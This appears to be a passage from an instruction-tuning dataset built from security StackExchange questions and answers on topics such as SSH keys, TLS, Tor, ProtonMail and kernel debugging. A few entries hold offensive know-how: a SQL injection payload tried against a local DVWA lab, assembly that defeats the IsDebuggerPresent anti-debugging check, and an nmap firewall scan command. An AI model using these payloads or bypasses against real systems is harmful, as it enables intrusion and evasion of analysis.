    "output": "If you have windbg installed you can use the Local kernel Debugging\nFacility to view the Disassembly of any kernel Routine.\nIn OS > WinXP you may need to enable /debug in bcdsettings (boot configuration).\nC:\\>kd -kl -c \"uf nt!KeReadyThread;q\" | grep -i -A 20 ke.*:\nnt!KeReadyThread:\n804fb7de 8bff            mov     edi,edi\n804fb7e0 55              push    ebp\n804fb7e1 8bec            mov     ebp,esp\n804fb7e3 53              push    ebx\n804fb7e4 ff1514774d80    call    dword ptr [nt!_imp__KeRaiseIrqlToDpcLevel (804d\n7714)]\n804fb7ea 8b4d08          mov     ecx,dword ptr [ebp+8]\n804fb7ed 8ad8            mov     bl,al\n804fb7ef e82e510000      call    nt!KiReadyThread (80500922)\n804fb7f4 8acb            mov     cl,bl\n804fb7f6 e86d5f0400      call    nt!KiUnlockDispatcherDatabase (80541768)\n804fb7fb 5b              pop     ebx\n804fb7fc 5d              pop     ebp\n804fb7fd c20400          ret     4\nquit:",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How do I view a kernel routine in Windows\nI've been reading a book about reverse engineering assembly code, and although it is very informative, It has questions such as decompile KeReadyThread- Im pretty good at assembly, and want to give it a shot, but how exactly do i view the assembly code of this kernel or any others? thanks",
      "answer": "If you have windbg installed you can use the Local kernel Debugging\nFacility to view the Disassembly of any kernel Routine.\nIn OS > WinXP you may need to enable /debug in bcdsettings (boot configuration).\nC:\\>kd -kl -c \"uf nt!KeReadyThread;q\" | grep -i -A 20 ke.*:\nnt!KeReadyThread:\n804fb7de 8bff            mov     edi,edi\n804fb7e0 55              push    ebp\n804fb7e1 8bec            mov     ebp,esp\n804fb7e3 53              push    ebx\n804fb7e4 ff1514774d80    call    dword ptr [nt!_imp__KeRaiseIrqlToDpcLevel (804d\n7714)]\n804fb7ea 8b4d08          mov     ecx,dword ptr [ebp+8]\n804fb7ed 8ad8            mov     bl,al\n804fb7ef e82e510000      call    nt!KiReadyThread (80500922)\n804fb7f4 8acb            mov     cl,bl\n804fb7f6 e86d5f0400      call    nt!KiUnlockDispatcherDatabase (80541768)\n804fb7fb 5b              pop     ebx\n804fb7fc 5d              pop     ebp\n804fb7fd c20400          ret     4\nquit:"
    }
  },
  {
    "instruction": "How did an attacker spoof (or add to) this myspace's login form?\nIn the attack detailed here, I see that a hacker has actually added a malicious post link. What I do not understand is how the attacker added it to the actual myspace.comdomain. \nObviously this is an old issue but I'm still curious if there is an attack that can spoof the domain name itself.",
    "context": "",
    "output": "According to the article a user created a user named \"login_home_index_html\" then they used HTML and CSS to hide stuff on their profile page and make it look like it was the legitimate login page.  From what it looks like is MySpace didn't sanitize its user's custom HTML properly.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How did an attacker spoof (or add to) this myspace's login form?\nIn the attack detailed here, I see that a hacker has actually added a malicious post link. What I do not understand is how the attacker added it to the actual myspace.comdomain. \nObviously this is an old issue but I'm still curious if there is an attack that can spoof the domain name itself.",
      "answer": "According to the article a user created a user named \"login_home_index_html\" then they used HTML and CSS to hide stuff on their profile page and make it look like it was the legitimate login page.  From what it looks like is MySpace didn't sanitize its user's custom HTML properly."
    }
  },
  {
    "instruction": "Answer the following question:\n\nHow does chmod 600 to private ssh keys make them secure? What is the \"minimum\" accepted to connect via SSH?\nJust finished a simple local file inclusion challenge and I wanted to make sure if I understood the issues around permissions and SSH keys correctly:\n-We set private ssh keys to 600 so only the user who owns them can read them. Say we had 777 instead of 600: That means that any user (so for example, www-data) can read them and thus can obtain the private key.\nWhat I don't understand is how or why when trying to connect over SSH to another host, said host knows that we have such permissions. (Is it the server or the local SSH process running that warns us?).\nAnd what is the minimum accepted to connect? I.e. the less restrictive permissions",
    "context": "",
    "output": "It is not about the SSH server knowing about the file permissions of the client. The scenario is instead having multiple users on the same computer or on the same shared network file system. Since the private key should identify a specific user it is necessary that other users on the same shared resource cannot read or manipulate the private key, i.e. the minimum permissions should allow read and write access only for the user itself, i.e. -rw------- which translates to (octal) 0600.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How does chmod 600 to private ssh keys make them secure? What is the \"minimum\" accepted to connect via SSH?\nJust finished a simple local file inclusion challenge and I wanted to make sure if I understood the issues around permissions and SSH keys correctly:\n-We set private ssh keys to 600 so only the user who owns them can read them. Say we had 777 instead of 600: That means that any user (so for example, www-data) can read them and thus can obtain the private key.\nWhat I don't understand is how or why when trying to connect over SSH to another host, said host knows that we have such permissions. (Is it the server or the local SSH process running that warns us?).\nAnd what is the minimum accepted to connect? I.e. the less restrictive permissions",
      "answer": "It is not about the SSH server knowing about the file permissions of the client. The scenario is instead having multiple users on the same computer or on the same shared network file system. Since the private key should identify a specific user it is necessary that other users on the same shared resource cannot read or manipulate the private key, i.e. the minimum permissions should allow read and write access only for the user itself, i.e. -rw------- which translates to (octal) 0600."
    }
  },
  {
    "instruction": "Can you tell me the answer to: How to get an \"A\" on Qualys SSL Labs with Apache 2.2?\nI've tried running Qualys' ssltest a few times and it keeps complaining that PFS isn't supported in some browsers. \nOn their blog, they suggest a configuration for Apache 2.4 that should get an \"A\" grade in their ssltest, but the configuration [predictably] doesn't earn an \"A\" in Apache 2.2.\nDoes anybody know if it's possible to get an \"A\" with Apache 2.2 on this test? If so, how?",
    "context": "",
    "output": "answer: Apache 2.2.26 added support for ephemeral Elliptic curve Diffie\u2013Hellman (ECDHE). This is likely what is preventing your ability to get an A on on the test. Some Internet Explorer browsers will prefer non-forward secrecy cipher suites when ECDHE is not available. This can also depends on if you prefer the server cipher order and other factors.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How to get an \"A\" on Qualys SSL Labs with Apache 2.2?\nI've tried running Qualys' ssltest a few times and it keeps complaining that PFS isn't supported in some browsers. \nOn their blog, they suggest a configuration for Apache 2.4 that should get an \"A\" grade in their ssltest, but the configuration [predictably] doesn't earn an \"A\" in Apache 2.2.\nDoes anybody know if it's possible to get an \"A\" with Apache 2.2 on this test? If so, how?",
      "answer": "Apache 2.2.26 added support for ephemeral Elliptic curve Diffie\u2013Hellman (ECDHE). This is likely what is preventing your ability to get an A on on the test. Some Internet Explorer browsers will prefer non-forward secrecy cipher suites when ECDHE is not available. This can also depends on if you prefer the server cipher order and other factors."
    }
  },
  {
    "instruction": "Answer the question below.\nCreating secure PIN in Java\nI need to create cryptographically secure PIN number in Java using secret id for each user.\nThis simple approach comes to mind:\nint getPin(String secretUserIdStr)\n{\n    String pepper = \"randomPepper...\";\n    String seed = secretUserIdStr + pepper;\n\n    SecureRandom sr = SecureRandom.getInstance(\"SHA1PRNG\", \"SUN\");  \n    sr.setSeed(seed.getBytes());\n\n    return sr.nextInt(10000);\n}\n\nIs this good idea? Is it secure? If not, what is the best practice?",
    "context": "",
    "output": "Don't do it. Reason: general principles. (\"Don't roll your own crypto.\")\nYou're deriving a key (something secret) from something else secret. You don't need to invent a procedure for yourself. Go with an established key derivation function. Something like PBKDF2.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Creating secure PIN in Java\nI need to create cryptographically secure PIN number in Java using secret id for each user.\nThis simple approach comes to mind:\nint getPin(String secretUserIdStr)\n{\n    String pepper = \"randomPepper...\";\n    String seed = secretUserIdStr + pepper;\n\n    SecureRandom sr = SecureRandom.getInstance(\"SHA1PRNG\", \"SUN\");  \n    sr.setSeed(seed.getBytes());\n\n    return sr.nextInt(10000);\n}\n\nIs this good idea? Is it secure? If not, what is the best practice?",
      "answer": "Don't do it. Reason: general principles. (\"Don't roll your own crypto.\")\nYou're deriving a key (something secret) from something else secret. You don't need to invent a procedure for yourself. Go with an established key derivation function. Something like PBKDF2."
    }
  },
  {
    "instruction": "Answer this question:\n\nIf Tor does Diffie-Hellman with each node how do they all not know the sender\nI'm a bit confused by something regarding Tor. As per what I have read and confirmed in this answer Tor: Is a Diffie-Hellman key exchange being done over recipient of traffic? the client does a DH key exchange with each node in the relay.\nThis results in 3 shared secrets and the client encrypts the message 3 times with each different key.\nTo decrypt the node uses its shared DH key to peel off a layer.\nProblem is that the node must know which DH shared secret to use as I assume there are many clients doing this and the node may have many of these. So in order to use the correct shared secret it needs to know which DH exchange this specific message is for and it can then know the sender.\nWhat an I missing?\nThanks, Chris",
    "context": "",
    "output": "A: The key exchange between a client and a relay is not done directly but is wrapped in the onion layers like any other communication: A connection (\"stream\") through the Tor network gets first build to the first relay, then through this first relay extended to the second relay etc.\nThis means that the relay will only have an association between a stream and a key, but not an association between a specific sender and a key. All it knows it that the same short-lived stream is associated with the same sender, but not who the sender is.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "If Tor does Diffie-Hellman with each node how do they all not know the sender\nI'm a bit confused by something regarding Tor. As per what I have read and confirmed in this answer Tor: Is a Diffie-Hellman key exchange being done over recipient of traffic? the client does a DH key exchange with each node in the relay.\nThis results in 3 shared secrets and the client encrypts the message 3 times with each different key.\nTo decrypt the node uses its shared DH key to peel off a layer.\nProblem is that the node must know which DH shared secret to use as I assume there are many clients doing this and the node may have many of these. So in order to use the correct shared secret it needs to know which DH exchange this specific message is for and it can then know the sender.\nWhat an I missing?\nThanks, Chris",
      "answer": "The key exchange between a client and a relay is not done directly but is wrapped in the onion layers like any other communication: A connection (\"stream\") through the Tor network gets first build to the first relay, then through this first relay extended to the second relay etc.\nThis means that the relay will only have an association between a stream and a key, but not an association between a specific sender and a key. All it knows it that the same short-lived stream is associated with the same sender, but not who the sender is."
    }
  },
  {
    "instruction": "I am unable to get rid of extra charecters with comments in SQL injection payload\nI am practicing SQL injection with DVWA, but for some reason the server keeps giving me an error even when I comment out extra '. \nFor example, here is what I inputed in my website:\nhttp://localhost/DVWA/vulnerabilities/sqli/?id=' OR SLEEP(5) AND 'a'='a' /* \n\nBut for some reason it still gives me an error even when I comment out all of the extra characters as shown in the URL when I used the /*. It keeps giving me the following error:\n\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'aaa'='aaa' /* '' at line 1.",
    "context": "",
    "output": "OK. After hours of testing, and retrying I found that by using the # I was able to comment out all of my extra characters",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "I am unable to get rid of extra charecters with comments in SQL injection payload\nI am practicing SQL injection with DVWA, but for some reason the server keeps giving me an error even when I comment out extra '. \nFor example, here is what I inputed in my website:\nhttp://localhost/DVWA/vulnerabilities/sqli/?id=' OR SLEEP(5) AND 'a'='a' /* \n\nBut for some reason it still gives me an error even when I comment out all of the extra characters as shown in the URL when I used the /*. It keeps giving me the following error:\n\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'aaa'='aaa' /* '' at line 1.",
      "answer": "OK. After hours of testing, and retrying I found that by using the # I was able to comment out all of my extra characters"
    }
  },
  {
    "instruction": "Answer the question below.\nAre Meltdown and Spectre complementary and used together\nMeltdown and Spectre have both been announced at the same time, almost always in the same sentence. Is there a connection, other than timing and the fact that they attack chips? Are they used together in tandem to exploit a system? Or is it just coincidence that they were announced at the same time?",
    "context": "",
    "output": "These are all attacks in the same area, i.e. using side channels during speculative execution in CPU's. It is not uncommon that if you find one problem you look deeper and find even more problems in the same area.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Are Meltdown and Spectre complementary and used together\nMeltdown and Spectre have both been announced at the same time, almost always in the same sentence. Is there a connection, other than timing and the fact that they attack chips? Are they used together in tandem to exploit a system? Or is it just coincidence that they were announced at the same time?",
      "answer": "These are all attacks in the same area, i.e. using side channels during speculative execution in CPU's. It is not uncommon that if you find one problem you look deeper and find even more problems in the same area."
    }
  },
  {
    "instruction": "Question: What is the meaning of Triage in Cybersec world?\nI searched Google about this term, but the definitions that I found was related to the medical world, and nothing related to IT. I think that is some kind of procedure of documenting something maybe? Note that I heard this word for the first time in the SOC (Security Operations Center) that I am currently working.",
    "context": "",
    "output": "Answer: In addition to Adonalsium's fine answer regarding prioritization, the triage step will include the initial routing of the event to the people best suited to handle it. \nA virus or ransomware attack would go to the operations team who would first isolate the computer to minimize collateral damage. A DDoS attack may go to the network team to start sinking the garbage packets. A report of suspicion may get placed in a queue for a generalist to handle later. Evidence of an intrusion may get escalated immediately to the Incident Management team.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "What is the meaning of Triage in Cybersec world?\nI searched Google about this term, but the definitions that I found was related to the medical world, and nothing related to IT. I think that is some kind of procedure of documenting something maybe? Note that I heard this word for the first time in the SOC (Security Operations Center) that I am currently working.",
      "answer": "In addition to Adonalsium's fine answer regarding prioritization, the triage step will include the initial routing of the event to the people best suited to handle it. \nA virus or ransomware attack would go to the operations team who would first isolate the computer to minimize collateral damage. A DDoS attack may go to the network team to start sinking the garbage packets. A report of suspicion may get placed in a queue for a generalist to handle later. Evidence of an intrusion may get escalated immediately to the Incident Management team."
    }
  },
  {
    "instruction": "Correct metasploit search usage (or bug?)\nI just noticed that the metasploit search keyword does not produce results as I'd expect it.\nIf I search e.g. with\nsearch platform:linux\n\nI get proper results limited to Linux.\nBut if I add another criterion it seems to combine them with OR instead of AND, as I would need it. Example:\nsearch platform:linux name:SMB\n\nThis gives me tons of results which are not limited to Linux and also Linux results that do not have SMB in their name.\nAm I using this wrong? Is my setup not working correctly? I sincerely hope this is not working as intended since with so many exploits and modules I'd really need to limit my searches by combining keywords and categories.",
    "context": "",
    "output": "This behavior changed in December 2016. search now returns an intersection of results for multiple keywords instead of a union.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Correct metasploit search usage (or bug?)\nI just noticed that the metasploit search keyword does not produce results as I'd expect it.\nIf I search e.g. with\nsearch platform:linux\n\nI get proper results limited to Linux.\nBut if I add another criterion it seems to combine them with OR instead of AND, as I would need it. Example:\nsearch platform:linux name:SMB\n\nThis gives me tons of results which are not limited to Linux and also Linux results that do not have SMB in their name.\nAm I using this wrong? Is my setup not working correctly? I sincerely hope this is not working as intended since with so many exploits and modules I'd really need to limit my searches by combining keywords and categories.",
      "answer": "This behavior changed in December 2016. search now returns an intersection of results for multiple keywords instead of a union."
    }
  },
  {
    "instruction": "Answer this question:\n\nLooking for open source crawler/spider & scanner\nUntil now I managed to look into Webscarab, Webscarab-NG, IronWASP & Burp extender.\nUnfortunately, except IronWASP, that refused to compile from the GIT source, none of the projects matched my criteria (Webscarab lacked the scanner, so does Webscarab-NG & Burp extender is indeed very nice, but not open source). \nDo you know about any other open source projects that might work?",
    "context": "",
    "output": "A: Wapiti (python) and Skipfish (C/C++) are both good open source scanners that are not bad.   My biggest complaint is that they are overly simplistic,  for instance Skipfish doesn't actually have an html parser,  instead it uses a system of overly simplistic regular expressions.  Wapiti uses Python's html parser,  which is better,  however Wapiti isn't actively maintained.   Skipfish's biggest problem is that it will DoS web application with the traffic it produces,  so I wouldn't run it on a production system. \nI studied both of these projects when building my scanner Sitewatch,  we provide a free service and its better than any open source web application scanner I am aware of.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Looking for open source crawler/spider & scanner\nUntil now I managed to look into Webscarab, Webscarab-NG, IronWASP & Burp extender.\nUnfortunately, except IronWASP, that refused to compile from the GIT source, none of the projects matched my criteria (Webscarab lacked the scanner, so does Webscarab-NG & Burp extender is indeed very nice, but not open source). \nDo you know about any other open source projects that might work?",
      "answer": "Wapiti (python) and Skipfish (C/C++) are both good open source scanners that are not bad.   My biggest complaint is that they are overly simplistic,  for instance Skipfish doesn't actually have an html parser,  instead it uses a system of overly simplistic regular expressions.  Wapiti uses Python's html parser,  which is better,  however Wapiti isn't actively maintained.   Skipfish's biggest problem is that it will DoS web application with the traffic it produces,  so I wouldn't run it on a production system. \nI studied both of these projects when building my scanner Sitewatch,  we provide a free service and its better than any open source web application scanner I am aware of."
    }
  },
  {
    "instruction": "Answer the following question:\n\nAdvantages of separating Web server from Database\nWhat are the security advantages of installing the database of a web application on a server other than the one containing the web server?",
    "context": "",
    "output": "Well the first obvious advantage is that if someone breaks the box that houses your application server, they are not guaranteed access to the same server that houses the database.  Also, by separating this functionality you make it easier on the IT (software devs, admins, etc) to minimize code change impact / policy updates on different aspects of the environment.  This does not in any way fix poor coding or weak security (SQL injection, default username/passwords). but it does facilitate a better security posture overall.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Advantages of separating Web server from Database\nWhat are the security advantages of installing the database of a web application on a server other than the one containing the web server?",
      "answer": "Well the first obvious advantage is that if someone breaks the box that houses your application server, they are not guaranteed access to the same server that houses the database.  Also, by separating this functionality you make it easier on the IT (software devs, admins, etc) to minimize code change impact / policy updates on different aspects of the environment.  This does not in any way fix poor coding or weak security (SQL injection, default username/passwords). but it does facilitate a better security posture overall."
    }
  },
  {
    "instruction": "Answer the following question:\n\nIDA - save work on kernel mode debugging\nI'm working with IDA pro on a kernel mode function (VMware + windbg) and I'm a annoying because I can't save the workstation state. IDA crash after 3 hours when I \"quit and save memory status\".\nIs there a plugin or anything else that could make me able to save my work (variables rename, commentaries and  others) ?\nThanks for reading (and answers =)",
    "context": "",
    "output": "Did you try debug IDA?  You may save your work via IDA snapshot feature.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "IDA - save work on kernel mode debugging\nI'm working with IDA pro on a kernel mode function (VMware + windbg) and I'm a annoying because I can't save the workstation state. IDA crash after 3 hours when I \"quit and save memory status\".\nIs there a plugin or anything else that could make me able to save my work (variables rename, commentaries and  others) ?\nThanks for reading (and answers =)",
      "answer": "Did you try debug IDA?  You may save your work via IDA snapshot feature."
    }
  },
  {
    "instruction": "How do I configure nmap to verify my firewall is performing stateful packet inspection?\nAs part of a compliance audit, I need to run a routine scan that verifies that our firewalls are performing stateful packet inspection on incoming packets. I have a dedicated server outside our network, on which I can run nmap or whatever software I need to, and scan the external port of our firewall.\nThe compliance audit manual says I should \"run NMAP on all TCP ports with \u201csyn reset\u201d or \u201dsyn ack\u201d bits set\", and that a response means 'packets are being allowed through even if they're not part of a previously established session'\nWhat are the nmap switches I need to scan a range of IP addresses - in this case a single /28 subnet - and report on which ports are open and whether the firewall is performing SPI?\nServer is Windows 2008; nmap version 5.21 is installed and working.",
    "context": "",
    "output": "The flag for SYN ACK scans is -sA. scanning all ports is -p- 192.168.0.0/28 will scan for the obvious subnet. You may want -vv to see more details\nThe following command:\nnmap -sA -p- 192.168.0.0/28 -vv\n\nshould work.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How do I configure nmap to verify my firewall is performing stateful packet inspection?\nAs part of a compliance audit, I need to run a routine scan that verifies that our firewalls are performing stateful packet inspection on incoming packets. I have a dedicated server outside our network, on which I can run nmap or whatever software I need to, and scan the external port of our firewall.\nThe compliance audit manual says I should \"run NMAP on all TCP ports with \u201csyn reset\u201d or \u201dsyn ack\u201d bits set\", and that a response means 'packets are being allowed through even if they're not part of a previously established session'\nWhat are the nmap switches I need to scan a range of IP addresses - in this case a single /28 subnet - and report on which ports are open and whether the firewall is performing SPI?\nServer is Windows 2008; nmap version 5.21 is installed and working.",
      "answer": "The flag for SYN ACK scans is -sA. scanning all ports is -p- 192.168.0.0/28 will scan for the obvious subnet. You may want -vv to see more details\nThe following command:\nnmap -sA -p- 192.168.0.0/28 -vv\n\nshould work."
    }
  },
  {
    "instruction": "Q: Do concurrent connections to an HTTPS website perform separate SSL handshakes?\nI know that most browsers nowadays support around 6 concurrent TCP sessions per hostname, to perform multiple requests at the same time.\nFor sites which utilise SSL, is there a separate handshake performed for each TCP session, or is a single SSL handshake performed, with the resulting symmetric key being reused for each concurrent TCP session?",
    "context": "",
    "output": " A: Each new connection does a separate TCP handshake and a separate TLS handshake. But if there is an existing SSL session they will try to reuse it, so all but the first connection to a server only do an abbreviated handshake if the server supports session reuse. In case of session reuse no key exchange is performed, that is the same symmetric key is re-used. See also How does SSL/TLS work?.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Do concurrent connections to an HTTPS website perform separate SSL handshakes?\nI know that most browsers nowadays support around 6 concurrent TCP sessions per hostname, to perform multiple requests at the same time.\nFor sites which utilise SSL, is there a separate handshake performed for each TCP session, or is a single SSL handshake performed, with the resulting symmetric key being reused for each concurrent TCP session?",
      "answer": "Each new connection does a separate TCP handshake and a separate TLS handshake. But if there is an existing SSL session they will try to reuse it, so all but the first connection to a server only do an abbreviated handshake if the server supports session reuse. In case of session reuse no key exchange is performed, that is the same symmetric key is re-used. See also How does SSL/TLS work?."
    }
  },
  {
    "instruction": "Bypass IsDebuggerPresent\nI have an address, that I think is not allowing me to run the debugger in IDA, I need help trying to stop it.  \nAlso , what does kernel32_IsDebuggerPresent mean?",
    "context": "",
    "output": "Let's have a look of the function's description in MSDN:\n\nDetermines whether the calling process is being debugged by a\n  user-mode debugger\n\nAs you guessed, this function is commonly used as an anti-debugging trick with the aim to break the process whenever the program detects that it is being debugged. IsDebuggerPresent checks for the BeingDebugged flag in the PEB (Process Environment Block) and will return a non-zero value if it is indeed being debug.\nYou have several options to bypass this trick, some of them are:\nRuntime patching: \n\nSet EAX to zero after IsDebuggerPresent being called\nModify the PEB itself by injecting this code:  \nmov eax,dword ptr fs:[18]\nmov eax,dword ptr ds:[eax+30]\nmov byte ptr ds:[eax+2],0\n\nThis will patch the BeingDebugged flag in the PEB, ensuring IsDebuggerPresent always returns 0.\nYou can use a plugin like idastealth\n\nPermanent Patching: \n\nYou can fill the call to IsDebuggerPresent with NOPs or something similar to skip the check",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Bypass IsDebuggerPresent\nI have an address, that I think is not allowing me to run the debugger in IDA, I need help trying to stop it.  \nAlso , what does kernel32_IsDebuggerPresent mean?",
      "answer": "Let's have a look of the function's description in MSDN:\n\nDetermines whether the calling process is being debugged by a\n  user-mode debugger\n\nAs you guessed, this function is commonly used as an anti-debugging trick with the aim to break the process whenever the program detects that it is being debugged. IsDebuggerPresent checks for the BeingDebugged flag in the PEB (Process Environment Block) and will return a non-zero value if it is indeed being debug.\nYou have several options to bypass this trick, some of them are:\nRuntime patching: \n\nSet EAX to zero after IsDebuggerPresent being called\nModify the PEB itself by injecting this code:  \nmov eax,dword ptr fs:[18]\nmov eax,dword ptr ds:[eax+30]\nmov byte ptr ds:[eax+2],0\n\nThis will patch the BeingDebugged flag in the PEB, ensuring IsDebuggerPresent always returns 0.\nYou can use a plugin like idastealth\n\nPermanent Patching: \n\nYou can fill the call to IsDebuggerPresent with NOPs or something similar to skip the check"
    }
  },
  {
    "instruction": "Question: RSSI of wifi device MITM detection\nLet's say there is someone doing some malicious activity on your network and you want to track the packet's signal strength to catch the attacker.\nIs this theory plausible?",
    "context": "",
    "output": "Answer: To find who is doing it, you can use a cantenna (more precise and mobile for this than a yagi - a cantenna does nothing except trap a bunch of waves in the can, which bounce around until they hit the feedpoint. It is directional only in the sense that the waves enter at the open end, and you point that at the waves you want to receive). \nUse a program like kismet/airodump-ng/kismac which has RFMON mode, and can see rx/tx quality from network peers. Then scan in all directions. \nOnce you have a few ideas of the direction, move outside and confirm it. Wifi signals bounce a lot. Eventually you find the point where the signal is strongest. This doesn't prove anything to anyone - except you - however. \nI expect you can do RFMON scanning with a rooted android phone, but haven't done it.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "RSSI of wifi device MITM detection\nLet's say there is someone doing some malicious activity on your network and you want to track the packet's signal strength to catch the attacker.\nIs this theory plausible?",
      "answer": "To find who is doing it, you can use a cantenna (more precise and mobile for this than a yagi - a cantenna does nothing except trap a bunch of waves in the can, which bounce around until they hit the feedpoint. It is directional only in the sense that the waves enter at the open end, and you point that at the waves you want to receive). \nUse a program like kismet/airodump-ng/kismac which has RFMON mode, and can see rx/tx quality from network peers. Then scan in all directions. \nOnce you have a few ideas of the direction, move outside and confirm it. Wifi signals bounce a lot. Eventually you find the point where the signal is strongest. This doesn't prove anything to anyone - except you - however. \nI expect you can do RFMON scanning with a rooted android phone, but haven't done it."
    }
  },
  {
    "instruction": "Answer this question:\n\nNetwork Concerns Over a MITM Attack\nIf my website is hosted on a network of hundreds, possibly thousands, of computers wouldn't an attacker have to gain control of just one of them in order to conduct a MITM attack on my website considering that I do not use any form of SSL encryption?",
    "context": "",
    "output": "A: If you are somehow conducting administrative tasks via unencrypted methods everything is in plain text. I hope you could not or would not do that over the internet. (chances are you ssh into that server for these tasks) However hypothetically speaking if this was the case and someone somehow sniffed your traffic or somehow got between you and your web-server (via MITM), then yes its totally possible. All your commands, passwords and html are right there in plain text ascii.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Network Concerns Over a MITM Attack\nIf my website is hosted on a network of hundreds, possibly thousands, of computers wouldn't an attacker have to gain control of just one of them in order to conduct a MITM attack on my website considering that I do not use any form of SSL encryption?",
      "answer": "If you are somehow conducting administrative tasks via unencrypted methods everything is in plain text. I hope you could not or would not do that over the internet. (chances are you ssh into that server for these tasks) However hypothetically speaking if this was the case and someone somehow sniffed your traffic or somehow got between you and your web-server (via MITM), then yes its totally possible. All your commands, passwords and html are right there in plain text ascii."
    }
  },
  {
    "instruction": "Answer this question:\n\nDoes rngd -r /path/to/file inject into /dev/urandom in addition to /dev/random?\nI'm new to the /dev/random and /dev/urandom pipes in general and have an application calling from /dev/urandom which I'm attempting to inject entropy into.  I'd prefer not to change the source for this application, but an additional process calling rngd -r /path/to/file from what I can tell appears to inject entropy into /dev/random and increment the size such that it can unblock.\nNow my question is: will rngd -r /path/to/file inject into /dev/urandom in parallel to /dev/random or is it limited to /dev/random?\nIf the answer is no, is there a similar utility which will inject into /dev/urandom - or even better - prepend bits to it such that the machine's PRNG is bypassed with the random entropy entirely in userland?",
    "context": "",
    "output": "A: On Linux at least, /dev/random and /dev/urandom are basically the same thing; more specifically they are both interfaces to the same internal RNG, called the Linux Random Number Generator (LRNG), that share an input entropy pool; the only difference between them is whether or not they block when the LRNG is at low entropy. \nAccording to the man page for /dev/random:\n\nWriting to /dev/random or /dev/urandom will update the entropy pool with the data written,\n\nOn the diagrams below, writing to either device from user space will go into the main input entropy pool that is shared by both output interfaces. (article).\nIn the current LRNG design, /dev/random/ and /dev/urandom each have their own output entropy pool and entropy counter:\n\nThere is also a 2020 paper by Stephan M\u00fcller (the linux kernel dev who maintains the LRNG) that brings /dev/random and /dev/urandom even closer by having them also share the same output pool (source article):\n\n\nSummary: Yes, rngd is adding entropy to both /dev/random and /dev/urandom.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Does rngd -r /path/to/file inject into /dev/urandom in addition to /dev/random?\nI'm new to the /dev/random and /dev/urandom pipes in general and have an application calling from /dev/urandom which I'm attempting to inject entropy into.  I'd prefer not to change the source for this application, but an additional process calling rngd -r /path/to/file from what I can tell appears to inject entropy into /dev/random and increment the size such that it can unblock.\nNow my question is: will rngd -r /path/to/file inject into /dev/urandom in parallel to /dev/random or is it limited to /dev/random?\nIf the answer is no, is there a similar utility which will inject into /dev/urandom - or even better - prepend bits to it such that the machine's PRNG is bypassed with the random entropy entirely in userland?",
      "answer": "On Linux at least, /dev/random and /dev/urandom are basically the same thing; more specifically they are both interfaces to the same internal RNG, called the Linux Random Number Generator (LRNG), that share an input entropy pool; the only difference between them is whether or not they block when the LRNG is at low entropy. \nAccording to the man page for /dev/random:\n\nWriting to /dev/random or /dev/urandom will update the entropy pool with the data written,\n\nOn the diagrams below, writing to either device from user space will go into the main input entropy pool that is shared by both output interfaces. (article).\nIn the current LRNG design, /dev/random/ and /dev/urandom each have their own output entropy pool and entropy counter:\n\nThere is also a 2020 paper by Stephan M\u00fcller (the linux kernel dev who maintains the LRNG) that brings /dev/random and /dev/urandom even closer by having them also share the same output pool (source article):\n\n\nSummary: Yes, rngd is adding entropy to both /dev/random and /dev/urandom."
    }
  },
  {
    "instruction": "Please answer this question: Can protonmail access my passwords and hence my secrets?\nprotonmail provides encrypted \"zero-access\" encryption mailboxes.\nThe way they explain \"zero-access\" is, at least for me, similar to zero-knowledge encryption.\nHowever protonmail has in its servers my private keys.\nThey say that the keys are encrypted as well, but they also have in their servers my password for that encryption.\nTherefore, it seems to me that protonmail could at any time access my private keys and my mailbox.\nIs this correct, or am I missing something?\nIs this the reason why they do not call it zero-knowledge encryption?",
    "context": "",
    "output": "You are wrong in your assumption that protonmail stores the password used for the encryption of your private key.\nProtonmail uses the Secure Remote Password Protocol (SRP on wikipedia - Protonmail blog post about SRP) and so they only store a verifier that is irreversibility related to your password.\nWhen entering your password on the login form of protonmail, some javascript is executed client side and generates this verifier that it sends to protonmail.\nUpon verification, protonmail returns the encrypted version of your private key which then gets decrypted client side using your password. This private key is then used to decrypt your emails.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Can protonmail access my passwords and hence my secrets?\nprotonmail provides encrypted \"zero-access\" encryption mailboxes.\nThe way they explain \"zero-access\" is, at least for me, similar to zero-knowledge encryption.\nHowever protonmail has in its servers my private keys.\nThey say that the keys are encrypted as well, but they also have in their servers my password for that encryption.\nTherefore, it seems to me that protonmail could at any time access my private keys and my mailbox.\nIs this correct, or am I missing something?\nIs this the reason why they do not call it zero-knowledge encryption?",
